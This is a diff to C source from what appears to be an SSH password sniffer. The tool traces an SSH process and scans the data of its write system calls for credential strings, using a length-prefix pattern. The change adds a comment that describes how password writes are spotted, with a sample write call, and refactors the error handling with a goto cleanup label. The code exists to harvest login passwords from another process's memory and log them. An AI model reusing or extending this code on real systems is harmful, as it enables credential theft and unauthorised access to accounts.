@@ -32,7 +32,19 @@ char *extract_write_string(pid_t traced_process, long length) {
   return strval;
 }
 
-// finds ssh password candidates in memory
+/*
+ * finds ssh password candidates in memory
+ * The write system call that transfers the
+ * credential strings (among other strings)
+ * begins with a length checksum at index 4 or 8
+ * into the string
+ *
+ * write("\x00\x00\x00\x00\x08password\x00")
+ *
+ * Search all write system calls for a checksum with a
+ * valid length string after and log them
+ *
+ */
 char *find_password_write(char *memory, unsigned long len) {
   char *retval = NULL;
   char *strval = NULL;
@@ -64,7 +76,7 @@ char *find_password_write(char *memory, unsigned long len) {
       retval = (char *) calloc(sizeof(char) * slen + 1, 1);
 
       if (!retval)
-        return NULL;
+        goto failed_find_password;
 
       memcpy(retval, strval, slen);
       free(memory_copy);
@@ -84,9 +96,8 @@ char *find_password_write(char *memory, unsigned long len) {
     if (slen == checksum) {
       retval = (char *) calloc(sizeof(char) * slen + 1, 1);
 
-      if (!retval) {
-        return NULL;
-      }
+      if (!retval)
+        goto failed_find_password;
 
       memcpy(retval, strval, slen);
       free(memory_copy);
@@ -95,6 +106,7 @@ char *find_password_write(char *memory, unsigned long len) {
 
   }
 
+failed_find_password:
   free(memory_copy);
   return NULL;
 }
